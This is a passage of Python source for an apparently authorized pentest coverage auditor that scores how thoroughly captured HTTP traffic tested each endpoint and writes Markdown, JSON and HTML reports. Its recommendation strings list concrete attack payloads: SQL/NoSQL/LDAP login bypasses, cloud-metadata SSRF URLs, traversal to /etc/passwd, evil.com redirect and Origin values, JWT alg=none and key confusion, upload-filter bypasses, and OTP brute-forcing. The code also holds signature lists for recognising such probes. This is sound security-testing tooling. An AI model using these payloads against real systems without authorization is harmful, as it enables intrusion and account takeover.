    wf = [k for k in all_params if WORKFLOW_PARAM.search(_norm_param(k))]
    if wf or state_changing:
        prior = _prior_step_hint(p)
        prior_txt = ("Observed immediately-prior step for this identity: `{0}` - try skipping it / replaying "
                     "this endpoint without first hitting it. ".format(prior)) if prior else ""
        g('logic', 'MEDIUM', 'Workflow/step bypass & race conditions not tested',
          'Multi-step or state-changing flow may skip steps or double-spend under concurrency.',
          'state-changing={0}, step params={1}, prior step={2}'.format(
              state_changing, wf[:5], prior or 'unknown'),
          prior_txt +
          'Jump to final step directly; replay confirm step; remove prerequisites. '
          'Race: fire 20-50 parallel requests (single-packet attack) for coupon/refund/withdraw/vote double-use.',
          'A04:2021 Insecure Design')

    # A05: METHODS / CORS / HEADER SPOOF
    untested_m = []
    if 'GET' in p.methods_seen and 'POST' not in p.methods_seen:
        untested_m.append('POST')
    if p.methods_seen and 'PUT' not in p.methods_seen:
        untested_m.append('PUT')
    if 'DELETE' not in p.methods_seen:
        untested_m.append('DELETE')
    if 'OPTIONS' not in p.methods_seen:
        untested_m.append('OPTIONS')
    if 'PATCH' not in p.methods_seen:
        untested_m.append('PATCH')
    if untested_m:
        g('method', 'MEDIUM', 'Methods not tested: {0}'.format(", ".join(untested_m)),
          'Some HTTP methods never attempted.', 'seen: {0}'.format(sorted(p.methods_seen)),
          'Send each. PUT/DELETE 200 = write/destroy misconfig; OPTIONS leaks Allow & CORS; '
          'TRACE = XST; WebDAV verbs (PROPFIND/MKCOL).',
          'A05:2021 Security Misconfiguration', 'coverage')

    if not _detect_cors_tested(p):
        g('header', 'MEDIUM', 'CORS / Origin trust not tested',
          'Reflected or null Origin trust can expose authenticated data cross-site. '
          '(Heuristic: Origin header never modified across captured requests.)',
          'modified headers: {0}'.format(sorted(p.headers_modified) or "none"),
          'Send `Origin: https://evil.com` and `Origin: null` -> check ACAO reflection + ACAC:true.',
          'A05:2021 Security Misconfiguration')
    else:
        credit()

    if (sens or state_changing) and not _detect_header_spoofing_tested(p):
        never = set(['x-forwarded-for', 'x-forwarded-host', 'host', 'referer', 'origin']) - p.headers_modified
        g('header', 'MEDIUM', 'Header spoofing not tested: {0}'.format(", ".join(sorted(never)) or "none"),
          'IP/host/origin trust headers never manipulated on a sensitive/write endpoint. '
          '(Heuristic: no X-Forwarded-*, X-Real-IP, X-Original-URL, X-Rewrite-URL observed.)',
          'modified: {0}'.format(sorted(p.headers_modified) or "none"),
          'Test X-Forwarded-For: 127.0.0.1 (ACL bypass/rate-limit), X-Forwarded-Host/Host: evil '
          '(cache poisoning & password-reset link poisoning), X-Original-URL.',
          'A05:2021 Security Misconfiguration')
    elif (sens or state_changing):
        credit()

    # A07: AUTH FAILURES - gate every gap on observed testing evidence so
    # re-running CoverMap after a retest visibly reduces gap count.
    auth_tested = _detect_auth_testing(p, all_params) if (fn & set(['auth', 'reset', 'register', 'otp'])) else set()

    if 'auth' in fn:
        if 'brute_volume' not in auth_tested:
            g('auth', 'HIGH', 'No brute-force / rate-limit / cred-stuffing test',
              'Login endpoint - lockout, throttling and credential stuffing not exercised. '
              '(Heuristic: <20 requests captured against this endpoint.)',
              'requests seen: {0}'.format(p.total_requests),
              'Fire 50+ wrong passwords (check lockout), password-spray one pwd across users, '
              'reuse breached creds, bypass lockout via X-Forwarded-For rotation & case/space user variants.',
              'A07:2021 Identification & Authentication Failures')
        else:
            credit()
        if not (auth_tested & set(['sqli', 'nosql', 'ldap'])):
            g('auth', 'HIGH', 'Auth bypass payloads not tested',
              'Login input not fuzzed for SQLi/NoSQL/LDAP auth bypass. '
              '(Heuristic: no auth-bypass signatures observed in username/password/email/uid values.)',
              'login form fields',
              "Username `' OR '1'='1'-- -`, `admin'-- -`, NoSQL `{\"$ne\":null}`, LDAP `*)(uid=*`, "
              "array-bind `user[]=a`. Also response/JWT-driven client trust bypass.",
              'A07:2021 Identification & Authentication Failures')
        else:
            credit()
        if not (auth_tested & set(['empty', 'null', 'bool', 'typeconfusion', 'removed'])):
            g('auth', 'CRITICAL', 'Structural parameter tampering on login NOT tested',
              'Param-removal / empty-value / null / type-confusion / array-bind cases on login fields - '
              'classic auth-bypass primitives that injection-payload fuzzing misses. '
              '(Heuristic: no field-removal, empty, null, bool or array/duplicate-key observed on login fields.)',
              'params: {0}'.format(_join_clean(all_params, limit=8)),
              STRUCTURAL_LOGIN,
              'A07:2021 Identification & Authentication Failures')
        else:
            credit()

    if 'reset' in fn:
        if not (auth_tested & set(['field_fuzzed', 'brute_volume'])):
            g('auth', 'CRITICAL', 'Password-reset weaknesses not tested',
              'Reset flow - token strength, host-header poisoning, and user-enum not proven. '
              '(Heuristic: <20 reqs and no per-field fuzzing of token/email observed.)',
              'params: {0}'.format(_join_clean(all_params, limit=6)),
              'Check token entropy/expiry/single-use; Host/X-Forwarded-Host poisoning to steal reset link; '
              'user-enumeration via response/timing; reset for victim then read token; param pollution on email.',
              'A07:2021 Identification & Authentication Failures')
        else:
            credit()
        if not (auth_tested & set(['empty', 'null', 'typeconfusion', 'removed'])):
            g('auth', 'CRITICAL', 'Structural parameter tampering on reset NOT tested',
              'Removing or emptying token/email/code may let the reset proceed without proof of identity. '
              '(Heuristic: no field-removal, empty, null or array value observed in reset fields.)',
              'params: {0}'.format(_join_clean(all_params, limit=8)),
              STRUCTURAL_RESET,
              'A07:2021 Identification & Authentication Failures')
        else:
            credit()

    if 'register' in fn:
        priv_keys_injected = _detect_mass_assign_tested(p)
        if not priv_keys_injected:
            g('auth', 'HIGH', 'Registration abuse not tested',
              'Signup - role mass-assignment, email-verification bypass, duplicate/overwrite not tested. '
              '(Heuristic: no privilege keys (role/is_admin/verified/etc.) observed in submitted body.)',
              'params: {0}'.format(_join_clean(all_params, limit=8)),
              'Inject role/is_admin during signup; register existing email (account takeover/overwrite); '
              'skip email verification; homoglyph/`+`/dot email tricks; mass-create (no captcha/rate-limit).',
              'A01:2021 Broken Access Control')
        else:
            credit()
        if not (auth_tested & set(['empty', 'null', 'typeconfusion', 'removed'])) and not priv_keys_injected:
            g('auth', 'HIGH', 'Structural parameter tampering on registration NOT tested',
              'Empty / missing / array-bound fields plus injected privilege keys give privilege escalation '
              'at signup time on backends that bind blindly. '
              '(Heuristic: no field-removal, empty, null, array value or privilege keys observed.)',
              'params: {0}'.format(_join_clean(all_params, limit=8)),
              STRUCTURAL_REGISTER,
              'A08:2021 Software & Data Integrity Failures')
        else:
            credit()

    if 'otp' in fn:
        if not (auth_tested & set(['brute_volume', 'field_fuzzed'])):
            g('auth', 'CRITICAL', 'OTP/2FA bypass not tested',
              'Verification endpoint - brute-force, reuse, and response-tamper not exercised. '
              '(Heuristic: <20 reqs and no per-field fuzzing of the code observed.)',
              'path={0}'.format(p.path),
              'Brute 000000-999999 (no rate-limit?); reuse/expired code; response-tamper success flag; '
              'remove 2fa param; race; backup-code abuse; null/`true` value.',
              'A07:2021 Identification & Authentication Failures')
        else:
            credit()
        if not (auth_tested & set(['empty', 'null', 'bool', 'typeconfusion', 'removed'])):
            g('auth', 'CRITICAL', 'Structural parameter tampering on OTP NOT tested',
              'Removing/blanking/null-typing the code param is one of the most common 2FA-bypass primitives. '
              'Replay and race round it out. '
              '(Heuristic: no field-removal, empty, null, bool or array value observed in OTP fields.)',
              'params: {0}'.format(_join_clean(all_params, limit=6)),
              STRUCTURAL_OTP,
              'A07:2021 Identification & Authentication Failures')
        else:
            credit()
    if 'logout' in fn:
        g('logic', 'MEDIUM', 'Session lifecycle / logout CSRF not tested',
          'Logout - server-side invalidation and CSRF not proven.',
          'methods: {0}'.format(sorted(p.methods_seen)),
          'Reuse cookie after logout (server-side kill?); logout CSRF; fixation: does session id rotate on login?',
          'A07:2021 Identification & Authentication Failures')
        g('logic', 'MEDIUM', 'Structural / state checks on logout NOT tested',
          'Session-state misuse around logout: post-logout cookie reuse, fixation, cross-session logout.',
          'methods: {0}'.format(sorted(p.methods_seen)),
          STRUCTURAL_LOGOUT,
          'A07:2021 Identification & Authentication Failures')

    # JWT
    tokens_lower = ' '.join(t.lower() for t in p.auth_tokens_seen)
    has_jwt_param = False
    for k in all_params:
        if 'jwt' in _u(k).lower():
            has_jwt_param = True
            break
    if 'bearer ' in tokens_lower or has_jwt_param:
        g('auth', 'HIGH', 'JWT attacks not tested',
          'Bearer/JWT observed - signature & claim handling not exercised.',
          'JWT/Bearer token present',
          "alg=none, RS256->HS256 confusion (sign with public key), kid path-traversal/SQLi, jku/x5u injection, "
          "weak HMAC secret brute (jwt_tool/hashcat), expired/`sub`/`role` claim edit, none-sig strip.",
          'A07:2021 Identification & Authentication Failures')

    # A10 + SSRF / Open redirect / Traversal / Upload / GraphQL
    for param, values in all_params.items():
        if _u(param).strip().lower() in FRAMEWORK_PARAMS:
            continue
        vals = list(values)
        ev = "{0}={1}".format(_u(param), _join_clean(vals, limit=3))
        np = _norm_param(param)
        if SSRF_PARAM.search(np) and not scanner_audited and not _has_sig(values, ('169.254', '127.0.0.1', 'localhost', '0.0.0.0', 'collab', 'interactsh', 'metadata')):
            _flag, _why = _value_shape_gate(param, values, _value_url_host_ip, 'URL/host/IP-shaped')
            if _flag:
                g('ssrf', 'HIGH', 'SSRF not tested on `{0}`'.format(param),
                  '`{0}` accepts URL/host input.{1}'.format(param, _why), ev,
                  "Cloud meta: `http://169.254.169.254/latest/meta-data/` (+ GCP `Metadata-Flavor`, Azure IMDS), "
                  "`http://localhost:port/`, `file:///etc/passwd`, `gopher://`, DNS-rebind, redirect-to-internal, "
                  "decimal/hex/IPv6 `[::1]`, `@`-trick `https://trusted@169.254.169.254`. Use Collaborator.",
                  'A10:2021 Server-Side Request Forgery')
        if OPEN_REDIRECT_PARAM.search(np) and not scanner_audited and not _has_sig(values, ('http://', 'https://', '//', '\\\\')):
            _flag, _why = _value_shape_gate(param, values, _value_urlish, 'URL/host-shaped')
            if _flag:
                g('redirect', 'MEDIUM', 'Open redirect not tested on `{0}`'.format(param),
                  '`{0}` looks like a redirect target.{1}'.format(param, _why), ev,
                  "Test `//evil.com`, `https://evil.com`, `/\\evil.com`, `https:evil.com`, `https://trusted@evil.com`, "
                  "`https://trusted.evil.com`, CRLF & whitelist-bypass variants. Chains into SSRF/OAuth-token theft.",
                  'A01:2021 Broken Access Control')
        if TRAVERSAL_PARAM.search(np) and not scanner_audited and not _has_sig(values, ('../', '..\\', '%2e%2e', '/etc/passwd', 'win.ini', '%252e')):
            _flag, _why = _value_shape_gate(param, values, _value_pathish, 'path-shaped')
            if _flag:
                g('traversal', 'HIGH', 'Path traversal / LFI not tested on `{0}`'.format(param),
                  '`{0}` suggests file/path handling.{1}'.format(param, _why), ev,
                  "Test `../../../../etc/passwd`, `..\\..\\windows\\win.ini`, `%2e%2e%2f`, double `%252e`, "
                  "`....//`, null `%00`, UNC `\\\\attacker\\share`, PHP wrappers `php://filter`. "
                  "Also LFI->RCE via log poisoning.",
                  'A01:2021 Broken Access Control')

    # File-upload surface. A generic/benign param (per_page/fields/...) carrying
    # only scalar-benign values is NOT an upload field even if its name matches
    # FILEUPLOAD_PARAM, so gate (a) drops it from upload detection.
    def _is_upload_param(k):
        return bool(FILEUPLOAD_PARAM.search(_norm_param(k))) and not _benign_scalar_skip(k, all_params.get(k, []))
    has_upload_param = any(_is_upload_param(k) for k in all_params)
    if 'upload' in fn or has_upload_param:
        upload_params = [k for k in all_params if _is_upload_param(k)][:5] or list(all_params)[:5]
        g('upload', 'HIGH', 'File-upload restrictions not tested',
          'Upload surface - extension/content-type/content validation not exercised.',
          'params: {0}'.format(upload_params),
          'Bypass ext filter: `.phtml/.pHp/.asp;.jpg/.aspx`, double-ext, null-byte, MIME spoof, magic-byte + polyglot, '
          'SVG/HTML XSS, path traversal in filename, zip-slip, huge file DoS. Find upload dir & request the file.',
          'A05:2021 Security Misconfiguration')
    if 'graphql' in fn:
        ops_seen = sorted(p.graphql_ops)
        ops_txt = _join_clean(ops_seen, limit=12) if ops_seen else 'none parsed from bodies'
        # Only claim introspection wasn't tested if it actually wasn't attempted.
        if p.graphql_introspection:
            credit()
            g('injection', 'MEDIUM', 'GraphQL: introspection WAS attempted - verify it is disabled',
              'A __schema/__type introspection query was observed against this endpoint. Confirm whether the '
              'server answered it (schema disclosure) or rejected it.',
              'operations seen: {0}'.format(ops_txt),
              'If introspection succeeds, dump the full schema and map every query/mutation; then test field/alias '
              'batching for rate-limit bypass, deeply-nested query DoS, and per-mutation authorization.',
              'A05:2021 Security Misconfiguration')
        else:
            g('injection', 'HIGH', 'GraphQL abuse not tested (no introspection attempt observed)',
              'GraphQL endpoint - introspection, batching and depth abuse not exercised. '
              '(Heuristic: no __schema/__type query seen in captured request bodies.)',
              'operations seen: {0}'.format(ops_txt),
              'Send introspection `{{__schema{{types{{name}}}}}}`; field/alias batching for brute-force & '
              'rate-limit bypass; deeply-nested query DoS; mutation authz; injection through args; '
              'suggestion-leak via typos.',
              'A05:2021 Security Misconfiguration')
        # Surface which operations were exercised vs. which appeared in responses,
        # so the analyst can spot mutations that were never authz-tested.
        resp_blob = _response_blob(p, limit=MAX_RESP_SAMPLES)
        ops_in_resp = sorted(o for o in p.graphql_ops if o and o in resp_blob)
        if ops_seen:
            g('injection', 'LOW', 'GraphQL operations exercised: {0}'.format(_join_clean(ops_seen, limit=8)),
              'Operations parsed from request bodies on this endpoint. Use as the authz/abuse test checklist - '
              'each mutation needs an explicit object/role authorization test.',
              'in requests: {0} | echoed in responses: {1}'.format(
                  _join_clean(ops_seen, limit=8), _join_clean(ops_in_resp, limit=8) or 'none'),
              'For each mutation, replay under a low-privilege identity and confirm server-side authorization.',
              'A01:2021 Broken Access Control', 'coverage')

    # RESPONSE TAMPERING / CLIENT-SIDE TRUST - context-specific targets, not generic.
    flip_targets = _response_flip_targets(p, fn)
    flips_rendered = "; ".join(flip_targets)
    g('response', 'HIGH' if (sens or 'auth' in fn or 'admin' in fn) else 'MEDIUM',
      'Response tampering / client-side trust not tested (endpoint-specific targets below)',
      'If the client makes auth/role/flow/state decisions from response fields, intercepting and editing '
      'the RESPONSE (or using Match & Replace) can unlock gated functionality. Targets below are derived '
      'from this endpoint\'s path, observed parameters, and observed status codes.',
      'status codes seen: {0}; param hints: {1}'.format(
          _join_clean(sorted(p.status_codes_seen)),
          _join_clean(all_params, limit=10)),
      'In Burp, intercept the RESPONSE (or set a Match & Replace rule). Specific flips to try on THIS endpoint: '
      + flips_rendered +
      '. After each flip, confirm whether server-side state actually changed (re-fetch with a clean session) '
      'or whether only the UI/page believed the flip - if server-side, you have a real auth/logic bug; '
      'if UI-only, document as defence-in-depth weakness (hidden-field disclosure, UI gating).',
      'A01:2021 Broken Access Control')

    # COVERAGE SIGNALS
    if p.total_requests >= 5 and len(set(p.response_lengths)) == 1 and len(p.status_codes_seen) == 1:
        g('response', 'MEDIUM', 'No response variance - negative cases missing',
          'Hit {0}x, always same status+length. Error paths never triggered.'.format(p.total_requests),
          'status={0}, length={1}'.format(list(p.status_codes_seen)[0], p.response_lengths[0]),
          'Test boundary values, invalid types, missing required params, oversized inputs, malformed JSON.',
          'A04:2021 Insecure Design', 'coverage')

    if p.behavior_class == 'single':
        g('behavior', 'HIGH' if sens else 'MEDIUM', 'Hit once - not actively tested',
          'Discovered but never actively tested.', '1 request total',
          'Revisit in Repeater: auth removal, param manipulation, method switching, injection sweep.',
          '', 'coverage')
    elif p.behavior_class == 'browse':
        g('behavior', 'LOW', 'Browsed but not actively tested',
          'Multiple requests, no param variation or response variance.',
          '{0} requests, no variation'.format(p.total_requests),
          'Explicitly test in Repeater with targeted param manipulation.', '', 'coverage')

    # ── RESPONSE-DRIVEN FINDINGS (read from captured response bodies/headers) ──
    # These are concrete evidence, not coverage gaps, so they are emitted as
    # kind='finding' (they do not penalise the coverage score) and the relevant
    # class is credited since it was demonstrably exercised.
    for (sev, title, detail, evidence, rec, owasp) in _response_content_findings(p):
        g('finding', sev, title, detail, evidence, rec, owasp, 'finding', 'evidence')
        credit()
    for (sev, title, detail, evidence, rec, owasp) in _response_header_findings(p, fn):
        g('header', sev, title, detail, evidence, rec, owasp, 'finding', 'observation')

    return gaps, credits[0]


def _score(p, gaps, credits=0):
    """Coverage score 0-100.

    Two components:
      * Behaviour + real coverage gaps  -> fixed penalties (as before).
      * Test surface                    -> RATIO based. The test penalty
        scales with how much of the attack surface is still untested:
        remaining_ratio = test_gaps / (test_gaps + credits). As the
        pentester exercises more classes on a retest, `credits` rises and
        `test_gaps` falls, so the penalty shrinks and the score climbs.
        This is what makes re-running the tool after a retest move the
        score, instead of saturating at a flat cap."""
    score = 100
    behavior_pen = {'single': 60, 'browse': 30, 'repeater': 0, 'intruder': 5}.get(p.behavior_class, 20)
    score -= behavior_pen
    weight = {'CRITICAL': 15, 'HIGH': 10, 'MEDIUM': 5, 'LOW': 2}
    for gp in gaps:
        if gp.kind == 'coverage' and gp.category != 'behavior':
            score -= weight.get(gp.severity, 3)
    # Ratio-based test-surface penalty (worth up to 50 points).
    test_gaps = sum(1 for gp in gaps if gp.kind == 'test')
    surface = test_gaps + credits
    if surface > 0:
        remaining_ratio = float(test_gaps) / surface
        score -= int(round(50 * remaining_ratio))
    if score < 0:
        score = 0
    if score > 100:
        score = 100
    return score


_SETCOOKIE_TITLE_RE = re.compile(r'^Set-Cookie `(.*?)` missing: (.*)$')


def _infra_dedup_key(host, gp):
    """Return a dedup key for findings that are HOST/INFRASTRUCTURE properties
    (set by the load balancer / web server / framework, identical across every
    endpoint on the host), or None for endpoint-specific findings.

    The key ALWAYS starts with `host` so app.x and admin.x never collapse into
    each other. Endpoint-specific findings (reflected input, SQL error, BOLA, ...)
    return None and are left untouched."""
    if gp.kind != 'finding':
        return None
    t = gp.title or ''
    m = _SETCOOKIE_TITLE_RE.match(t)
    if m:
        cookie_name, flags = m.group(1), m.group(2)
        missing_flag_set = frozenset(f.strip() for f in flags.split(',') if f.strip())
        return (host, 'set-cookie', cookie_name, missing_flag_set)
    if t.startswith('Missing Content-Security-Policy'):
        return (host, 'csp', t)
    if t.startswith('Missing HSTS'):
        return (host, 'hsts', t)
    if t.startswith('CORS:'):                      # wildcard / origin-reflected ACAO
        return (host, 'cors', t)
    return None


def _dedup_host_infra(audits):
    """Emit host/infra findings ONCE per (host + signature) instead of once per
    endpoint. Keeps the first occurrence, drops the rest, and annotates the
    survivor with '(applies to N endpoints on this host)'. This collapses the
    flood of identical LB-cookie / missing-CSP / CORS findings (e.g. 31 copies of
    the same AWSALB Set-Cookie finding) to a single representative each."""
    counts = {}
    for a in audits:
        for gp in a.gaps:
            k = _infra_dedup_key(a.host, gp)
            if k is not None:
                counts[k] = counts.get(k, 0) + 1
    seen = set()
    for a in audits:
        kept = []
        for gp in a.gaps:
            k = _infra_dedup_key(a.host, gp)
            if k is not None:
                if k in seen:
                    continue                       # duplicate host property -> drop
                seen.add(k)
                n = counts.get(k, 1)
                if n > 1:
                    gp.detail = '{0} (applies to {1} endpoints on this host)'.format(gp.detail, n)
            kept.append(gp)
        a.gaps = kept
    return audits


def analyse(profiles):
    audits = []

    def sort_key(p):
        sens = 0 if SENSITIVE_PATH.search(p.path) else 1
        cls_w = {'single': 0, 'browse': 1, 'repeater': 2, 'intruder': 3}.get(p.behavior_class, 2)
        return (sens, cls_w)

    sorted_profiles = sorted(profiles.values(), key=sort_key)
    for p in sorted_profiles:
        gaps, credits = _heuristics(p)
        score = _score(p, gaps, credits)
        query_params_out = {}
        for k, v in p.query_params.items():
            query_params_out[k] = list(v)
        body_params_out = {}
        for k, v in p.body_params.items():
            body_params_out[k] = list(v)
        audit = EndpointAudit(
            endpoint_id=p.endpoint_id, host=p.host, path=p.path,
            behavior_class=p.behavior_class, total_requests=p.total_requests,
            coverage_score=score,
            methods_seen=list(p.methods_seen),
            query_params=query_params_out,
            body_params=body_params_out,
            auth_coverage={'with_auth': p.requests_with_auth,
                           'without_auth': p.requests_without_auth,
                           'distinct_tokens': len(p.auth_tokens_seen)},
            status_codes=list(p.status_codes_seen),
            response_length_range={'min': min(p.response_lengths) if p.response_lengths else 0,
                                   'max': max(p.response_lengths) if p.response_lengths else 0},
            sample_requests=p.sample_requests,
            gaps=gaps,
        )
        audit.tests_credited = round(credits, 1)   # test classes proven exercised (climbs on retest)
        audit.tools_seen = sorted(p.tools_seen)
        audit.scanner_audited = _scanner_audited(p)
        audit.scanner_hits = p.scanner_hits
        audit.intruder_hits = p.intruder_hits
        # New RESPONSE / cross-identity / GraphQL evidence (surfaced in JSON).
        xident_tested, xident_crit = _cross_identity_idor(p)
        audit.response_evidence = {
            'responses_captured': len(p.response_samples),
            'reflected_values': sorted(p.reflected_values)[:20],
            'set_cookies_seen': p.set_cookies_seen[:10],
            'response_headers': dict((k, sorted(v)[:5]) for k, v in p.response_headers_seen.items()),
        }
        audit.cross_identity = {
            'identities_seen': len(p.identity_object_access),
            'idor_tested': bool(xident_tested),
            'confirmed_bola': xident_crit,
        }
        audit.graphql = {
            'operations': sorted(p.graphql_ops),
            'introspection_attempted': p.graphql_introspection,
        } if (p.graphql_ops or p.graphql_introspection) else None
        audit.response_times = {
            'count': len(p.response_times),
            'min': min(p.response_times) if p.response_times else None,
            'max': max(p.response_times) if p.response_times else None,
            'avg': (sum(p.response_times) / len(p.response_times)) if p.response_times else None,
        } if p.response_times else None
        audits.append(audit)
    # Collapse host/infrastructure findings (LB cookies, missing CSP/HSTS, CORS)
    # to one per (host + signature) before reporting. Runs after scoring so it
    # cannot desync coverage scores (findings never feed the score anyway).
    _dedup_host_infra(audits)
    audits.sort(key=lambda a: a.coverage_score)
    return audits


# ============================================================
# REPORT GENERATORS
# ============================================================

def score_label(s):
    for r, label in SCORE_BANDS:
        if s in r:
            return label
    return 'UNKNOWN'


def _html_escape(s):
    return (_u(s).replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
            .replace('"', '&quot;'))


def _mermaid_safe(s):
    return re.sub(r'[()#:"`\[\]{}]', ' ', _u(s)).strip()


def to_markdown(audits, engagement):
    now = datetime.now().strftime("%Y-%m-%d %H:%M")
    total = len(audits)
    total_gaps = sum(len(a.gaps) for a in audits)
    critical = sum(1 for a in audits for gp in a.gaps if gp.severity == 'CRITICAL')
    high = sum(1 for a in audits for gp in a.gaps if gp.severity == 'HIGH')
    untested = sum(1 for a in audits if a.behavior_class in ('single', 'browse'))
    avg = sum(a.coverage_score for a in audits) // max(total, 1)

    lines = [
        "# Pentest Coverage Audit - {0}".format(engagement),
        "_Generated: {0}_".format(now),
        "_Next: run `pentest-coverage-analyser` Claude Code skill against `_audit.json`_",
        "", "---", "",
        "## Summary", "",
        "| Metric | Value |", "|--------|-------|",
        "| Endpoints | {0} |".format(total),
        "| Avg Score | {0}/100 - {1} |".format(avg, score_label(avg)),
        "| Not Tested | {0} ({1}%) |".format(untested, untested * 100 // max(total, 1)),
        "| Total Gaps | {0} |".format(total_gaps),
        "| Critical | {0} |".format(critical),
        "| High | {0} |".format(high), "",
    ]

    cat = defaultdict(lambda: defaultdict(int))
    for a in audits:
        for gp in a.gaps:
            cat[gp.category][gp.severity] += 1
    lines += ["## Gap Categories", "",
              "| Category | Critical | High | Medium | Low |",
              "|----------|----------|------|--------|-----|"]
    for c in sorted(cat.keys()):
        sevs = cat[c]
        lines.append("| {0} | {1} | {2} | {3} | {4} |".format(
            c.upper(), sevs.get('CRITICAL', 0), sevs.get('HIGH', 0),
            sevs.get('MEDIUM', 0), sevs.get('LOW', 0)))
    lines.append("")

    owasp = defaultdict(int)
    for a in audits:
        for gp in a.gaps:
            if gp.owasp:
                owasp[gp.owasp] += 1
    if owasp:
        lines += ["## OWASP Top 10 - Untested Surface", "",
                  "| OWASP Category | Recommended tests |", "|----------------|-------------------|"]
        for o in sorted(owasp.keys()):
            lines.append("| {0} | {1} |".format(o, owasp[o]))
        lines.append("")

    lines += ["## Priority Endpoints", "",
              "| Score | Endpoint | Behavior | C | H |",
              "|-------|----------|----------|---|---|"]
    for a in audits[:20]:
        c = sum(1 for gp in a.gaps if gp.severity == 'CRITICAL')
        h = sum(1 for gp in a.gaps if gp.severity == 'HIGH')
        lines.append("| {0} - {1} | `{2}{3}` | {4} | {5} | {6} |".format(
            a.coverage_score, score_label(a.coverage_score),
            a.host, a.path, a.behavior_class.upper(), c, h))
    lines.append("")

    lines += ["---", "", "## Detailed Gaps", ""]
    for a in audits:
        if not a.gaps:
            continue
        lines += [
            "### `{0}{1}`".format(a.host, a.path), "",
            "**Score:** {0}/100 - {1}  ".format(a.coverage_score, score_label(a.coverage_score)),
            "**Behavior:** {0} | **Requests:** {1} | **Methods:** {2}  ".format(
                a.behavior_class.upper(), a.total_requests, ", ".join(a.methods_seen)),
            "**Auth:** {0} authenticated / {1} unauthenticated  ".format(
                a.auth_coverage['with_auth'], a.auth_coverage['without_auth']), "",
        ]
        for sev in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
            for gp in [x for x in a.gaps if x.severity == sev]:
                owasp_tag = " - _{0}_".format(gp.owasp) if gp.owasp else ""
                lines += [
                    "#### [{0}] {1}{2}".format(sev, gp.title, owasp_tag), "",
                    "**Detail:** {0}  ".format(gp.detail),
                    "**Evidence:** `{0}`  ".format(gp.evidence),
                    "**Test / Fix:** {0}".format(gp.recommendation), "",
                ]
        lines += ["---", ""]

    untested_list = [a for a in audits if a.behavior_class == 'single']
    if untested_list:
        lines += ["## Untested Endpoints (Single Hit)", ""]
        for a in untested_list:
            lines.append("- `{0}{1}`".format(a.host, a.path))

    return "\n".join(lines)


def to_json(audits):
    out = []
    for a in audits:
        out.append({
            "endpoint_id": a.endpoint_id, "host": a.host, "path": a.path,
            "behavior_class": a.behavior_class, "total_requests": a.total_requests,
            "coverage_score": a.coverage_score, "coverage_label": score_label(a.coverage_score),
            "tests_credited": getattr(a, 'tests_credited', 0),
            "test_gaps_remaining": sum(1 for gp in a.gaps if gp.kind == 'test'),
            "findings_count": sum(1 for gp in a.gaps if gp.kind == 'finding'),
            "tools_seen": getattr(a, 'tools_seen', []),
            "scanner_audited": getattr(a, 'scanner_audited', False),
            "response_evidence": getattr(a, 'response_evidence', {}),
            "cross_identity": getattr(a, 'cross_identity', {}),
            "graphql": getattr(a, 'graphql', None),
            "response_times": getattr(a, 'response_times', None),
            "methods_seen": a.methods_seen, "query_params": a.query_params,
            "body_params": a.body_params, "auth_coverage": a.auth_coverage,
            "status_codes": a.status_codes, "response_length_range": a.response_length_range,
            "sample_requests": a.sample_requests,
            "gaps": [{"category": gp.category, "severity": gp.severity, "title": gp.title,
                      "detail": gp.detail, "evidence": gp.evidence,
                      "recommendation": gp.recommendation,
                      "owasp": gp.owasp, "kind": gp.kind}
                     for gp in a.gaps],
        })
    return json.dumps(out, indent=2)


def _gap_gid(endpoint_id, gp):
    """Stable per-gap id, identical across re-runs of CoverMap as long as the
    endpoint + category + OWASP tag + title are unchanged. localStorage keys in
    the HTML report are derived from this, so analyst progress (status/notes)
    survives re-generation of the report."""
    raw = u"{0}|{1}|{2}|{3}".format(endpoint_id, gp.category, gp.owasp or u'', gp.title)
    return hashlib.md5(raw.encode('utf-8')).hexdigest()[:12]


# Severity -> CSS tag class (shared by findings + endpoint gap rows).
_SEV_TAG = {'CRITICAL': 't-crit', 'HIGH': 't-high', 'MEDIUM': 't-med', 'LOW': 't-low'}
# Stable status <select>; JS sets the active value from localStorage on load.
_STATUS_SELECT = (
    '<select class="g-status">'
    '<option>Open</option><option>In Progress</option><option>Tested</option>'
    '<option>False Positive</option><option>N/A</option><option>Confirmed Finding</option>'
    '</select>')


def _html_gap_row(a, gp):
    """One interactive checklist row for a single gap. Carries a stable data-gid,
    a 'done' checkbox, a status <select>, a collapsible notes <textarea>, and
    data-* attributes the client-side filters key off. No literal braces in the
    .format template; all dynamic text routed through _html_escape()."""
    gid = _gap_gid(a.endpoint_id, gp)
    sev = gp.severity
    sevcls = _SEV_TAG.get(sev, 't-low')
    kind = gp.kind or 'coverage'
    default_status = 'Confirmed Finding' if kind == 'finding' else 'Open'
    owasp_badge = ('<span class="owasp">{0}</span>'.format(_html_escape(gp.owasp))
                   if gp.owasp else '')
    search = _html_escape(u" ".join([
        _u(gp.title), _u(gp.detail), _u(gp.evidence), _u(gp.recommendation)]).lower())
    ep_label = _html_escape(u"{0}{1}".format(a.host, a.path))
    return (
        '<div class="gap-row k-{kind} gs-{sev}" data-gid="{gid}" data-sev="{sev}" '
        'data-kind="{kind}" data-owasp="{owasp}" data-default-status="{dstatus}" '
        'data-title="{dtitle}" data-ep="{dep}" '
        'data-search="{search}">'
        '<div class="gap-head">'
        '<input type="checkbox" class="g-check" title="Mark tested / done">'
        '<span class="tag {sevcls}">{sev}</span>{owasp_badge}'
        '<span class="g-title">{title}</span>'
        '{status_select}'
        '<button type="button" class="g-note-toggle" title="Toggle analyst notes">note</button>'
        '</div>'
        '<div class="gap-body">'
        '<div class="muted">{detail}</div>'
        '<div class="ev">Evidence: <code>{evidence}</code></div>'
        '<div class="rec">Test / Fix: {rec}</div>'
        '<textarea class="g-note hidden" placeholder="Analyst notes (saved in this browser)..."></textarea>'
        '</div></div>'
    ).format(
        kind=_html_escape(kind), sev=sev, sevcls=sevcls, gid=gid,
        owasp=_html_escape(gp.owasp or ''), dstatus=default_status, search=search,
        dtitle=_html_escape(gp.title), dep=ep_label,
        owasp_badge=owasp_badge, title=_html_escape(gp.title),
        status_select=_STATUS_SELECT, detail=_html_escape(gp.detail),
        evidence=_html_escape(gp.evidence), rec=_html_escape(gp.recommendation))


def to_html(audits, engagement):
    """Self-contained interactive HTML report. The analyst drives it as a live
    engagement checklist: per-gap done/status/notes persist to window.localStorage
    (namespaced by engagement so multiple reports don't collide), with filtering,
    progress tracking, collapsible cards, JSON export and print-friendly CSS."""
